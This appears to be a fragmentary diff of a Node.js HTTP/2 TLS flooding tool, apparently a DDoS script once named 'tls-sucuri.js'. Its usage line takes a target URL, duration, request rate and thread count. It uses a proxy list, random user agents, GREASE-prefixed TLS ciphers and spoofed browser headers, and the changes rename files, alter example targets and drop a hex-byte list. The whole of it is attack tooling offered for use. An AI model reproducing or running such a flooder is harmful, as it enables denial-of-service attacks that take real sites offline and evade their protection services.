@@ -1,4 +1,4 @@
-const net = require("net");
+ const net = require("net");
  const http2 = require("http2");
  const tls = require("tls");
  const cluster = require("cluster");
@@ -9,37 +9,8 @@ const net = require("net");
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
 
- if (process.argv.length < 5){
-    console.log(`Tls by Rizz\nUsage: node tls-sucuri.js URL TIME REQ_PER_SEC THREADS\nExample: node tls-sucuri.js https://dstat.cc/ 60 64 10`); process.exit();}
+ if (process.argv.length < 5){console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
  
- const nullHexs = [
-"\x00", 
-"\xFF", 
-"\xC2", 
-"\xA0",
-"\x82",
-"\x56",
-"\x87",
-"\x88",
-"\x27",
-"\x31",
-"\x18",
-"\x42",
-"\x17",
-"\x90",
-"\x14",
-"\x82",
-"\x18",
-"\x26",
-"\x61",
-"\x04",
-"\x05",
-"\xac",
-"\x02",
-"\x50",
-"\x84",
-"\x78"
-];
  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
  const ciphers = "GREASE:" + [
      defaultCiphers[2],
@@ -81,7 +52,7 @@ const net = require("net");
  
  const secureContext = tls.createSecureContext(secureContextOptions);
  
- var proxyFile = "http.txt";
+ var proxyFile = "proxy.txt";
  var proxies = readLines(proxyFile);
  var userAgents = readLines("ua.txt");
  
@@ -182,7 +153,6 @@ const net = require("net");
  headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-mode"] = "navigate";
- headers["x-requested-with"] = "XMLHttpRequest";
  headers["sec-fetch-site"] = "same-origin";
  headers["upgrade-insecure-requests"] = "1";
  
